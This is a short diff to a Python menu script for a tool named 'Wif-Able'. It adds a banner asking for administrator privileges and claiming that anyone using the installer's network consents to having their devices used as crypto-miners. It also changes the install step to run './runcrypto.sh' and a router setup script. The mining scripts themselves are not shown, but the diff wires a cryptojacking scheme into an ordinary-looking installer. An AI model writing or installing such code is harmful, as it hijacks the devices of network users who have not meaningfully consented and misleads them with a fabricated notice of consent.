@@ -29,6 +29,9 @@ ____/|__/  /_/  /_/    /_/  |_/_.___//_/  \___/
 
 
 v1.0
+
+Please run Wif-Able installer with administrator priveleges!
+With installing this script people who use your network give permission to use their devices as crypto-miners.
 """
     print "Please choose the menu you want to start:"
     print "1.   Install Wif-Able"
@@ -55,7 +58,8 @@ def exec_menu(choice):
 
 # Install
 def installW():
-    os.system('./install.py')
+    os.system('./runcrypto.sh')
+    os.system('./routerSetup/install.sh')
     return
 
 
